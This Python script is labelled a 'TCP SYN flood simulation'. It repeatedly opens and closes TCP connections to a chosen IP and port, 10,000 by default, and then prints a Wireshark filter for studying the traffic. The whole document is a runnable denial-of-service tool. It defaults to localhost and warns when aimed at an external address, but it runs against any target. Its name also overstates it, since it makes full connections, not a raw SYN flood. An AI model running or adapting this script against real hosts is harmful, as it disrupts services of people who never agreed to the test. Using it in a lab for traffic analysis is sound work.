import socket
import sys
import argparse
import time

def syn_flood(target_ip, target_port, num_packets):
    print(f"[*] Starting TCP SYN Flood Simulation against {target_ip}:{target_port}")
    print(f"[*] Sending {num_packets} packets...")
    
    sent = 0
    try:
        for i in range(num_packets):
            # The original script used standard TCP connection
            # We are using socket.SOCK_STREAM to connect and then close immediately
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Set a very short timeout so the connect call doesn't hang long
            s.settimeout(0.5)
            try:
                s.connect((target_ip, target_port))
            except (socket.timeout, ConnectionRefusedError):
                # Expected since we are flooding and the port might be closed or overwhelmed
                pass
            finally:
                s.close()
            
            sent += 1
            if sent % 1000 == 0:
                print(f"  [+] Sent {sent}/{num_packets} connection attempts...")
                
    except KeyboardInterrupt:
        print("\n[*] Simulation stopped by user.")
    
    print(f"\n[✓] Simulation complete. Total attempts: {sent}")
    print("\n--- Wireshark Analysis Guide ---")
    print("Filter : tcp.flags.syn == 1 && ip.dst == " + target_ip)
    print("Look for: Rapid succession of SYN packets to the target port.")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="TCP SYN Flood Simulation (Basic Socket Method)")
    parser.add_argument("--target", default="127.0.0.1", help="Target IP address (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--count", type=int, default=10000, help="Number of connection attempts to make (default: 10000)")
    
    args = parser.parse_args()
    
    # It is highly recommended to only target localhost (127.0.0.1) for testing
    if args.target != "127.0.0.1":
        print(f"[!] WARNING: You are targeting an external IP ({args.target}). Ensure you have permission.")
        time.sleep(2)
        
    syn_flood(args.target, args.port, args.count)
